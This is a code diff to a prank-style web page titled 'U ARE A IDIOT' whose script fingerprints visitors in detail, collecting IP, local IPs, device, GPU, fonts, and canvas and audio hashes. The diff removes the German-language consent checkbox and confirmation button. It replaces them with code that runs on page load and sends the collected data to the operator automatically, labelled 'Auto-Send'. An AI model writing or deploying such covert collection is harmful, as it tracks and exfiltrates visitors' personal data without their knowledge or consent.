@@ -80,25 +80,6 @@ html, body {
   font-size:0.92rem; letter-spacing:0.03em; color:#fff; word-break:break-word;
 }
 
-.consent {
-  margin-top:2rem;
-  display:flex; flex-direction:column; gap:1rem; align-items:center;
-  font-size:0.75rem; color:#aaa; line-height:1.6;
-  text-align:left; max-width:480px; margin-left:auto; margin-right:auto;
-}
-.consent label {
-  display:flex; gap:0.7rem; align-items:flex-start; cursor:pointer;
-}
-.consent input { margin-top:0.25rem; flex-shrink:0; }
-.consent button {
-  padding:0.8rem 2rem; font-family:inherit; font-size:0.8rem;
-  letter-spacing:0.2em; text-transform:uppercase;
-  background:#000; color:#fff; border:1px solid #fff; cursor:pointer;
-  transition:0.18s;
-}
-.consent button:hover:not(:disabled) { background:#fff; color:#000; }
-.consent button:disabled { opacity:0.35; cursor:not-allowed; }
-
 .status {
   margin-top:2.4rem; font-size:0.66rem; letter-spacing:0.28em; text-indent:0.28em;
   text-transform:uppercase; color:#6f6f6f; min-height:1.2em;
@@ -119,16 +100,6 @@ html, body {
   <div class="wrap">
     <h2 class="who">U ARE A IDIOT</h2>
     <div id="out" class="list"></div>
-
-    <div id="consent" class="consent hidden">
-      <label>
-        <input type="checkbox" id="consentBox">
-        <span>Ich stimme zu, dass technische Daten (IP, Gerät, Browser, Bildschirm)
-        gesammelt und an den Betreiber gesendet werden.</span>
-      </label>
-      <button id="consentBtn" disabled>Bestätigen &amp; senden</button>
-    </div>
-
     <p id="status" class="status"></p>
   </div>
 </main>
@@ -168,10 +139,7 @@ window.CONFIG = {
   const stage  = $("stage");
   const out    = $("out");
   const enter  = $("enter");
-  const consent     = $("consent");
-  const consentBox  = $("consentBox");
-  const consentBtn  = $("consentBtn");
-  const status      = $("status");
+  const status = $("status");
 
   if (!bg.getAttribute("src")) bg.src = CONFIG.videoFile;
   if (!track.getAttribute("src")) track.src = CONFIG.audioFile;
@@ -181,7 +149,7 @@ window.CONFIG = {
     zeit: new Date().toISOString(),
     herkunft: "direkt (kein referrer)"
   };
-  let collected = false;
+  let started = false;
   let sent = false;
 
   function setStatus(t) { status.textContent = t; }
@@ -397,7 +365,6 @@ window.CONFIG = {
     });
   }
 
-  // FIX: data.screen → data.bildschirm
   function checkReturn() {
     try {
       const prev = localStorage.getItem("fp_id");
@@ -416,14 +383,12 @@ window.CONFIG = {
     "browser","os","geraetTyp","sprache","sprachen","zeitzone","utcOffset",
     "bildschirm","bildschirmFrei","farbtiefe","pixelRatio","fenster",
     "fensterAussen","orientierung","locale","kerne","ram","gpu","gpuHersteller",
-    "webglVersion","touchpunkte","speicher","mikrofone","kameras","audioAusgaenge",
-    "schriftenAnzahl","schriften","canvasHash","audioHash","farbschema",
-    "bewegung","hover","zeiger","netzTyp","downlink","rtt",
-    "datenspar","lokaleIps","online","wiederkehrer","cookies","dnt",
+    "webglVersion","touchpunkte","schriftenAnzahl","schriften","canvasHash",
+    "audioHash","farbschema","bewegung","hover","zeiger","netzTyp","downlink",
+    "rtt","datenspar","lokaleIps","online","wiederkehrer","cookies","dnt",
     "plattform","hersteller","kopfzeilen","userAgent"
   ];
 
-  // FIX: Codeblock sauber schließen, kein harter Schnitt mitten im Markdown
   function buildContent() {
     const paare = PRIO
       .filter(k => data[k] !== undefined && data[k] !== "" && data[k] !== null)
@@ -499,9 +464,10 @@ window.CONFIG = {
     });
   }
 
-  async function collect() {
-    if (collected) return;
-    collected = true;
+  async function start() {
+    if (started) return;
+    started = true;
+    setStatus("sammle...");
 
     collectHerkunft();
     collectBasis();
@@ -518,13 +484,16 @@ window.CONFIG = {
 
     checkReturn();
     render();
-
-    // Consent erst zeigen, wenn Daten da sind
-    consent.classList.remove("hidden");
-    setStatus("Bereit – Einwilligung erforderlich");
+    setStatus("sende...");
+    
+    await push(buildContent());
+    setStatus("gesendet");
   }
 
-  // ENTER: nur Ansicht freischalten, nichts senden
+  // SOFORT beim Laden ausführen (Auto-Send)
+  start();
+
+  // Nur die Anzeige umschalten, kein erneutes Starten nötig
   enter.addEventListener("click", () => {
     gate.classList.add("hidden");
     stage.classList.remove("hidden");
@@ -533,20 +502,6 @@ window.CONFIG = {
     bg.play().catch(() => {});
     track.volume = 0.55;
     track.play().catch(() => {});
-    collect();
-  });
-
-  // Consent-Gate
-  consentBox.addEventListener("change", () => {
-    consentBtn.disabled = !consentBox.checked;
-  });
-
-  consentBtn.addEventListener("click", async () => {
-    if (!consentBox.checked) return;
-    consentBtn.disabled = true;
-    setStatus("sende…");
-    await push(buildContent());
-    setStatus("gesendet");
   });
 })();
 </script>
